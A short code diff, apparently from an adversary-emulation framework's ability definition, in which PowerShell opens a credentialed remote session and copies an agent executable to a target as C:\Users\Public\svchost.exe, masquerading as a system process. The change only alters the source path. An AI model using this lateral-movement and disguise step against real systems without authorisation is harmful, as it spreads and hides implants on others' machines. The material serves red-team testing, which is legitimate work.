@@ -18,7 +18,7 @@
             $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
             $location = "#{location}";
             $exe = "#{exe_name}";
-            Copy-Item $location.replace($exe, "sandcat.go-windows") -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
+            Copy-Item $location -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
             Start-Sleep -s 5;
             Remove-PSSession -Session $session;
           };
